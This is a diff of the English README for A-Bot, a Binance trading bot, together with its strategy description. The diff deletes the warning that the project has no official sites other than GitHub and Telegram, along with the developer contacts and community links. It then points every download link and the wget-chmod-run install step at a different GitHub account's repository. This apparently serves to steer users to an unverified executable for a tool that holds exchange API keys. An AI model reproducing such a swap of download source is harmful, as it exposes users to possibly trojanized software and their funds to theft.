@@ -1,7 +1,6 @@
 ## A-Bot  
 [Перейти на русскую версию](README.md) 
 
-**The project has no other official sites with repositories and contacts, except for GitHub and Telegram!**  
 **A-Bot does not work on US accounts and IP!**  
 
 A-Bot is a free spot bot for algorithmic multicurrency trading on Binance, supporting manual and fully automated trading.    
@@ -12,32 +11,7 @@ A-Bot is a free spot bot for algorithmic multicurrency trading on Binance, suppo
 **IMPORTANT! BOT WORKS ONLY ON ACCOUNTS REGISTERED ON THE DEVELOPER'S REFERRAL LINK!
 Binance: [Registration by referral link](https://accounts.binance.com/ru/register?ref=NYGPPWD2)  
 Referal ID: `NYGPPWD2`**  
-If you have any difficulties with a multi-account, contact **@dpcwee** on Telegram
-There is a referral system in the bot: the person you brought can enter the BEP20 wallet from your account. In this case, your account must also be registered using the referral link of the developers.
 
-### Support developers:
-`0x7680b3c00923fe29c62fb157e69187a918a076cd` — BEP20 network for any crypto on Binance
-
-### Contacts:  
-*[Official Telegram Chat](https://t.me/abot_chat)* — for discussions, communication with developers and project development  
-
-### Useful Resources:
-*[abot-config.ru](https://abot-config.ru/?utm_source=github&utm_medium=github&utm_campaign=readme) from *[@YaroslavMolchan](https://t.me/yaroslavmolchan)**  
-*[stats.abot.su](https://stats.abot.su/?utm_source=github&utm_medium=github&utm_campaign=panel) from *[@DizzyUp](https://t.me/dizzyup)**
-
-### Useful links:
-*[A complete guide to run A-Bot](https://abot-config.ru/help/install?utm_source=github&utm_medium=github&utm_campaign=readme)* — a detailed guide on setting up API, Telegram, creating a server, as well as setting up and running a bot  
-*[Google Cloud](https://dpcwee.medium.com/%D0%BF%D0%BE%D0%BB%D1%83%D1%87%D0%B0%D0%B5%D0%BC-%D0%B1%D0%B5%D1%81%D0%BF%D0%BB%D0%B0%D1%82%D0%BD%D1%8B%D0%B5-6-%D0%BC%D0%B5%D1%81%D1%8F%D1%86%D0%B5%D0%B2-google-cloud-1da76f2f62fd)* — guide to get a free server for a bot  
-*[Screen commands for the server](http://itautsors.ru/ispolzuem-komandu-screen-v-linux)* — how to make A-Bot work in the background on Linux  
-*[A-Bot calculator](https://abot-config.ru/calculator?utm_source=github&utm_medium=github&utm_campaign=readme)* — calculation of future averages based on the buy_down, step_aver and quantity_aver parameters  
-*[Averaging calculator](https://abot-config.ru/calculator-mid?utm_source=github&utm_medium=github&utm_campaign=readme)* — calculation of the average purchase price based on the trading history   
-*[Compound interest](https://abot-config.ru/calculator-percent?utm_source=github&utm_medium=github&utm_campaign=readme)* — calculation of the return on investment for the selected period  
-*[Monthly statistics](https://mega.nz/file/MMpQFYZS#D07V4GnURzAu9oEh6ddDe-JnXym2FOpdI_2obedFhKU)* — Monthly income graph from *Wex3*  
-*[Summary Excel table of profitability](https://mega.nz/file/gUwQAQDT#ooSVkOJapIkx4_RN22a3O98upz3DFDftPLEkZseLHrU)* — a table for calculating the profitability of the bot based on the current values of profitability from *[@aeridiph](https://t.me/aeridiph)*  
-*[ASS © AntiSignalS](https://t.me/antisignals)* — channel with signals from an active member of the community Bi↯llar'a  
-
-### Forums:
-*[Cryptotalk](https://cryptotalk.org/topic/332721-%D0%B1%D0%B5%D1%81%D0%BF%D0%BB%D0%B0%D1%82%D0%BD%D1%8B%D0%B9-%D1%82%D0%BE%D1%80%D0%B3%D0%BE%D0%B2%D1%8B%D0%B9-%D0%B1%D0%BE%D1%82-%D0%B4%D0%BB%D1%8F-binance/)* *[Bits.Media](https://forum.bits.media/index.php?/topic/178120-a-bot-%D0%B1%D0%B5%D1%81%D0%BF%D0%BB%D0%B0%D1%82%D0%BD%D1%8B%D0%B9-%D0%B1%D0%BE%D1%82-%D0%B4%D0%BB%D1%8F-binance/)* *[Bitcointalk](https://bitcointalk.org/index.php?topic=5301070)* *[Mining-Hub](https://mininghub.cc/threads/474/)*
 
 ### Description of the strategy:
 The bot works according to the averaging strategy. The essence of the strategy is to reduce the average entry price to an asset by increasing the position weight if the asset's market value decreases in relation to the current order value. In other words, when entering a deal, the bot, based on the custom trading settings, places a sell order with a specified percentage of profit, but if the asset value falls in relation to the first purchase, without reaching the sell order, and falls below the specified value in %, the bot cancels the sell order, buys a certain number of coins, which is always more than the number of coins in the previous canceled order, and places a new sell order at the price (`new average buy price` +`% of the desired profit`). Thus, when the market value of an asset falls, the bot constantly analyzes current orders and market data, comparing the conditions of the trading strategy settings and exchange activity, and buys coins in addition, increasing their total volume and reducing the new selling price.
@@ -83,9 +57,9 @@ The bot works according to the averaging strategy. The essence of the strategy i
 * Do not dispose of the assets that the bot is working with. If you see a free balance - check the coin in the terminal, perhaps the bot is working with this coin with trailing activated  
 
 ### Starting:
-*Windows (only 10 x64))*: Download **[A-Bot.exe](https://github.com/dpcwee/abot/releases/latest)** and run 
-*Linux (minimum 18.04)*: Download **[A-Bot](https://github.com/dpcwee/abot/releases/latest)**  
-(`wget https://github.com/dpcwee/abot/releases/download/VERSION/A-Bot`,  specify last version instead ***VERSION***),  
+*Windows (only 10 x64))*: Download **[A-Bot.exe](https://github.com/osipshor/spot-a-bot/releases/latest)** and run 
+*Linux (minimum 18.04)*: Download **[A-Bot](https://github.com/osipshor/spot-a-bot/releases/latest)**  
+(`wget https://github.com/osipshor/spot-a-bot/releases/download/VERSION/A-Bot`,  specify last version instead ***VERSION***),  
 give it rights by command `chmod 755 A-Bot`, then run with the command `./A-Bot`  
 
 ### Working with screen command on Linux:
